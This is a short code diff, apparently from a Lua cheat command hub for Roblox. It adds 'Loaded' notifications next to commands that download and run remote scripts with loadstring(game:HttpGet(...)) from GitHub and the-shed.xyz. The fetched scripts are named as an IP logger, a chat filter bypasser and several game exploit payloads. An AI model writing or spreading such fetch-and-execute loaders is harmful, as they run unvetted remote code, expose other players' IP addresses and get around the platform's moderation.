@@ -1712,21 +1712,27 @@ end
 	end
 	if Command("infiniteyield") or Command("yield") then
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+		Notify("Infinite Yield Loaded", Color3.fromRGB(0, 255 ,0), "Success")
 	end
 	if Command("spookyware") or Command("reanim1") then
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/SpookyWare'),true))()
+		Notify("SpookyWare Loaded", Color3.fromRGB(0, 255 ,0), "Success")
 	end
 	if Command("iplogger") or Command("iplog") then
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/IpLogger'),true))()
+		Notify("IpLogger Loaded", Color3.fromRGB(0, 255 ,0), "Success")
 	end
 	if Command("scp") or Command("reanim2") then
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/FE%20SCP'),true))()
+		Notify("FE Scp Loaded", Color3.fromRGB(0, 255 ,0), "Success")
 	end
 	if Command("fecat") or Command("reanim3") then
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/FeCat'),true))()
+		Notify("FE Cat Loaded", Color3.fromRGB(0, 255 ,0), "Success")
 	end
 	if Command("chatbypasser") or Command("chatb") then
 	    loadstring(game:HttpGet(('https://the-shed.xyz/roblox/scripts/ChatBypass'),true))()
+		Notify("Chat Bypasser Loaded", Color3.fromRGB(0, 255 ,0), "Success")
 	end
 
 	if Command("fly") then
